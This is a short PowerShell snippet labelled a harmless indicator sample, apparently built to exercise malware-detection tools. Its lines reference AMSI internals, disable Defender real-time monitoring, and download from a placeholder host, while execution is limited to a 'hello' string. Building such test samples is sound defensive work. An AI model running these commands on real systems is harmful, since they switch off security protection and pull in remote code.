# harmless indicator sample
$ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
Set-MpPreference -DisableRealtimeMonitoring $true
$a = 'Write-' + 'Host hello'
$wc = New-Object Net.WebClient
$s = $wc.DownloadString('http://example.invalid/x')
IEX ($a)
